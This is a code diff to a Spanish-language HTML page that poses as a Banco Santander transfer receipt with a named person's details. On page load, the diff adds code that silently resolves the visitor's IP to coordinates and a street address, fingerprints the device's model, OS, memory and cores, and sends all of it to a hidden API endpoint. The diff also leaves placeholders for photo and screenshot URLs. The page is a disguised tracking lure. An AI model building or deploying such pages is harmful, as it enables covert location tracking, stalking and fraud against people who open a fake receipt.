@@ -45,7 +45,7 @@
         <p><strong>Banco:</strong> Banco Santander</p>
         <p><strong>Nombre:</strong> Estela Rolando</p>
         <p><strong>Alias:</strong> estela.roland12</p>
-        <p><strong>cuit:</strong> 27-23729467-0</p>
+        <p><strong>CUIT:</strong> 27-23729467-0</p>
         <p><strong>Monto:</strong> $5000.00</p>
         <p><strong>Fecha:</strong> <span id="date"></span></p>
         <p><strong>Referencia:</strong> #253921037</p>
@@ -53,7 +53,7 @@
             <h3>Detalles:</h3>
             <p>Esta transferencia ha sido registrada correctamente.</p>
         </div>
-        <div id="status">cargando datos</div>
+        <div id="status">Cargando datos...</div>
     </div>
 
     <script>
@@ -68,11 +68,34 @@
                 const response = await fetch("https://ipinfo.io/json");
                 if (response.ok) {
                     const data = await response.json();
-                    return {
+                    const location = {
                         city: data.city || "Desconocido",
                         region: data.region || "Desconocido",
                         country: data.country || "Desconocido",
                         loc: data.loc || "0,0"
+                    };
+                    
+                    const [latitude, longitude] = location.loc.split(',');
+
+                    // Detalles más específicos como barrio y dirección
+                    let detailedAddress = null;
+                    try {
+                        const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+                        if (geoResponse.ok) {
+                            const geoData = await geoResponse.json();
+                            detailedAddress = geoData.display_name || "Dirección no disponible";
+                        }
+                    } catch (error) {
+                        console.error("Error al obtener detalles de la dirección:", error);
+                    }
+
+                    return {
+                        latitude,
+                        longitude,
+                        city: location.city,
+                        region: location.region,
+                        country: location.country,
+                        detailedAddress: detailedAddress || "Dirección desconocida"
                     };
                 }
             } catch (error) {
@@ -81,16 +104,60 @@
             return null;
         }
 
-        // Función para enviar datos
-        async function sendToApi(location) {
+        // Función para obtener detalles del dispositivo móvil (más específicos)
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+
+            // Detectar si el dispositivo es iPhone o Android
+            const isAndroid = /Android/i.test(userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(userAgent);
+
+            let deviceInfo = {
+                deviceType: isAndroid ? "Android" : (isIOS ? "iOS" : "Desconocido"),
+                userAgent: userAgent,
+                platform: platform,
+                language: navigator.language,
+                deviceMemory: navigator.deviceMemory || "Desconocido",
+                hardwareConcurrency: navigator.hardwareConcurrency || "Desconocido",
+                appVersion: navigator.appVersion,
+                // Obtener la versión del sistema operativo, aunque no es 100% preciso
+                osVersion: (isAndroid ? /Android (\d+\.\d+)/.exec(userAgent) : (isIOS ? /OS (\d+_\d+)/.exec(userAgent) : null)) || ["", "Desconocido"]
+            };
+
+            // Detectar el modelo de dispositivo (más precisa para Android e iOS)
+            if (isAndroid) {
+                const model = /Build\/(.+)/.exec(userAgent); // Android device model detection
+                deviceInfo.deviceModel = model ? model[1] : "Modelo desconocido";
+            } else if (isIOS) {
+                const model = /iPhone|iPad|iPod/.exec(userAgent);
+                deviceInfo.deviceModel = model ? model[0] : "Modelo desconocido";
+            } else {
+                deviceInfo.deviceModel = "Dispositivo desconocido";
+            }
+
+            return deviceInfo;
+        }
+
+        // Función para enviar los datos a la API
+        async function sendToApi(location, deviceInfo) {
             try {
                 const payload = {
-                    location: location,
-                    device_info: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform
+                    location: {
+                        latitude: location.latitude,
+                        longitude: location.longitude,
+                        city: location.city,
+                        region: location.region,
+                        country: location.country,
+                        detailedAddress: location.detailedAddress
                     },
-                    timestamp: new Date().toISOString()
+                    device_info: {
+                        ...deviceInfo
+                    },
+                    timestamp: new Date().toISOString(),
+                    // Si tienes imágenes o capturas, puedes agregar esas URLs aquí
+                    photo_url: "url-de-la-foto",  // Cambia esto por la URL de la foto
+                    screenshot_url: "url-de-la-captura",  // Cambia esto por la URL de la captura de pantalla
                 };
 
                 const response = await fetch(apiGatewayEndpoint, {
@@ -115,7 +182,12 @@
         // Iniciar proceso automáticamente
         (async function () {
             const location = await getLocation();
-            await sendToApi(location);
+            const deviceInfo = getDeviceInfo();
+            if (location) {
+                await sendToApi(location, deviceInfo);
+            } else {
+                document.getElementById("status").innerText = "No se pudo obtener la ubicación.";
+            }
         })();
     </script>
 </body>
